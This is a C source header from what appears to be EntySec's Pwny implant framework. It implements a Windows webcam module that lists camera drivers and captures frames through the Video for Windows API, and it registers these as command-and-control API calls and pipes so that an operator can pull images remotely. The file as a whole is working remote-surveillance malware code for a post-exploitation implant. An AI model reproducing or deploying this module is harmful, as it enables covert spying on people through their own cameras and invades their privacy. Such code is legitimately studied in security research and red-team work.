/*
 * MIT License
 *
 * Copyright (c) 2020-2024 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#ifndef _CAM_H_
#define _CAM_H_

#include <windows.h>
#include <dshow.h>

#include <pwny/tlv.h>
#include <pwny/api.h>
#include <pwny/c2.h>
#include <pwny/tlv_types.h>
#include <pwny/log.h>

#define CAM_BASE 5

#define CAM_LIST \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       CAM_BASE, \
                       API_CALL)

#define CAM_SNAP \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       CAM_BASE, \
                       API_CALL + 1)

#define CAM_PIPE \
        TLV_PIPE_CUSTOM(PIPE_STATIC, \
                        CAM_BASE, \
                        PIPE_TYPE)

#define TLV_TYPE_CAM_ID TLV_TYPE_CUSTOM(TLV_TYPE_INT, CAM_BASE, API_TYPE)

/*
 * Windows camera capture using the AVCap/VFW (Video for Windows) API.
 * This uses capCreateCaptureWindow + WM_CAP messages which are
 * lightweight and don't require the full DirectShow COM graph.
 */

#include <vfw.h>

typedef struct
{
    HWND hCapWnd;
    int device_id;
    LPBYTE frame_data;
    DWORD frame_size;
    CRITICAL_SECTION cs;
    int frame_ready;
} cam_t;

static LRESULT CALLBACK cam_frame_callback(HWND hCapWnd, LPVIDEOHDR lpVHdr)
{
    cam_t *cam;

    cam = (cam_t *)capGetUserData(hCapWnd);
    if (cam == NULL || lpVHdr == NULL)
    {
        return 0;
    }

    EnterCriticalSection(&cam->cs);

    if (cam->frame_data != NULL)
    {
        free(cam->frame_data);
    }

    cam->frame_data = (LPBYTE)malloc(lpVHdr->dwBytesUsed);
    if (cam->frame_data != NULL)
    {
        memcpy(cam->frame_data, lpVHdr->lpData, lpVHdr->dwBytesUsed);
        cam->frame_size = lpVHdr->dwBytesUsed;
        cam->frame_ready = 1;
    }

    LeaveCriticalSection(&cam->cs);

    return 0;
}

static int cam_device_open(cam_t *cam, int device_id)
{
    cam->device_id = device_id;
    cam->frame_data = NULL;
    cam->frame_size = 0;
    cam->frame_ready = 0;

    InitializeCriticalSection(&cam->cs);

    cam->hCapWnd = capCreateCaptureWindowA(
        "PwnyCam", 0, 0, 0, 320, 240, 0, 0);

    if (cam->hCapWnd == NULL)
    {
        log_debug("* Failed to create capture window\n");
        return -1;
    }

    capSetUserData(cam->hCapWnd, (LONG_PTR)cam);

    if (!capDriverConnect(cam->hCapWnd, device_id))
    {
        log_debug("* Failed to connect driver (%d)\n", device_id);
        DestroyWindow(cam->hCapWnd);
        return -1;
    }

    capSetCallbackOnFrame(cam->hCapWnd, cam_frame_callback);
    capPreviewRate(cam->hCapWnd, 66);  /* ~15 fps */
    capPreview(cam->hCapWnd, TRUE);

    return 0;
}

static void cam_device_close(cam_t *cam)
{
    capPreview(cam->hCapWnd, FALSE);
    capSetCallbackOnFrame(cam->hCapWnd, NULL);
    capDriverDisconnect(cam->hCapWnd);
    DestroyWindow(cam->hCapWnd);
    DeleteCriticalSection(&cam->cs);

    if (cam->frame_data != NULL)
    {
        free(cam->frame_data);
        cam->frame_data = NULL;
    }
}

static int cam_grab_frame(cam_t *cam, void **buffer, DWORD *size)
{
    int tries;
    MSG msg;

    /* Pump messages to process captured frames */
    for (tries = 0; tries < 50; tries++)
    {
        while (PeekMessage(&msg, cam->hCapWnd, 0, 0, PM_REMOVE))
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }

        capGrabFrame(cam->hCapWnd);
        Sleep(50);

        EnterCriticalSection(&cam->cs);
        if (cam->frame_ready)
        {
            *buffer = malloc(cam->frame_size);
            if (*buffer != NULL)
            {
                memcpy(*buffer, cam->frame_data, cam->frame_size);
                *size = cam->frame_size;
            }
            cam->frame_ready = 0;
            LeaveCriticalSection(&cam->cs);
            return (*buffer != NULL) ? 0 : -1;
        }
        LeaveCriticalSection(&cam->cs);
    }

    return -1;
}

static int cam_create(pipe_t *pipe, c2_t *c2)
{
    int device;
    cam_t *cam;

    device = 0;
    tlv_pkt_get_u32(c2->request, TLV_TYPE_CAM_ID, &device);

    cam = (cam_t *)calloc(1, sizeof(*cam));
    if (cam == NULL)
    {
        return -1;
    }

    if (cam_device_open(cam, device) == -1)
    {
        free(cam);
        return -1;
    }

    pipe->data = cam;
    return 0;
}

static int cam_readall(pipe_t *pipe, void **buffer)
{
    cam_t *cam;
    DWORD size;

    cam = (cam_t *)pipe->data;
    size = 0;

    if (cam_grab_frame(cam, buffer, &size) == -1)
    {
        return -1;
    }

    return (int)size;
}

static int cam_destroy(pipe_t *pipe, c2_t *c2)
{
    cam_t *cam;

    cam = (cam_t *)pipe->data;
    cam_device_close(cam);
    free(cam);

    return 0;
}

static tlv_pkt_t *cam_list(c2_t *c2)
{
    int iter;
    char name[80];
    char version[80];
    tlv_pkt_t *result;

    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);

    for (iter = 0; iter < 10; iter++)
    {
        if (capGetDriverDescriptionA(iter, name, sizeof(name),
                                     version, sizeof(version)))
        {
            tlv_pkt_add_string(result, TLV_TYPE_STRING, name);
        }
    }

    return result;
}

void register_cam_api_calls(api_calls_t **api_calls)
{
    api_call_register(api_calls, CAM_LIST, cam_list);
}

void register_cam_api_pipes(pipes_t **pipes)
{
    pipe_callbacks_t callbacks;

    memset(&callbacks, 0, sizeof(callbacks));
    callbacks.create_cb = cam_create;
    callbacks.readall_cb = cam_readall;
    callbacks.destroy_cb = cam_destroy;

    api_pipe_register(pipes, CAM_PIPE, callbacks);
}

#endif
